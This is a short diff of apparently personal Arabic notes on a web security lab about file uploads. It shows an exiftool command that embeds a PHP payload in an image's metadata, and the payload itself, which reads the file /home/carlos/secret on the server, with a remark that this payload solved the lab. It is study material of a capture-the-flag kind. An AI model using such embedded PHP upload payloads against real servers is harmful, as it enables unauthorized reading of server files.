@@ -20,7 +20,7 @@ exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' imag
 
 الباي لود ده ينفع و انا حليت ب ده
 
-(  <?php echo file_get_contents("/home/carlos/secret"); ?>  )
+//<?php echo file_get_contents("/home/carlos/secret"); ?>
 بس هحطو داخل محتوي الصوره نفسو و هبعت هيتبعت بعد كده ادور علي الكود بس وسط الحجات الي متشفره
 
 
